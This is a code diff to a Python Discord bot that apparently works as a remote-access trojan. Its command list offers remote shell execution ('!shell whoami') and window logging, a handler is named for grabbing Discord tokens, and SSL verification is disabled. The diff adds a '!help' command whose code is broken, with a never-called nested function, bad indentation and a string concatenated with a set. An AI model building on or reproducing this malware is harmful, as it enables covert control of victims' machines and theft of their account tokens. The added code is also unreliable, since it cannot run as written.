@@ -32,7 +32,7 @@ bot = commands.Bot(command_prefix='!')
 ssl._create_default_https_context = ssl._create_unverified_context
 helpmenu = """
 Availaible commands are :
-
+--> !help = Shows this helpmenu (in the discord)
 --> !message = Show a message box displaying your text / Syntax  = "!message example"
 --> !shell = Execute a shell command /Syntax  = "!shell whoami"
 --> !windowstart = Start logging current user window (logging is shown in the bot activity)
@@ -1178,6 +1178,10 @@ async def on_message(message):
                 await message.channel.send("[*] Command successfuly executed")  
             else:
                 await message.channel.send("[*] This command requires admin privileges")
+
+        if message.content == "!help":
+            async def send(ctx):
+    await ctx.send("Here's the helpmenu"+{helpmenu})
         if message.content == "!getdiscordtokens":
             from asyncio.proactor_events import _ProactorSocketTransport
             import os
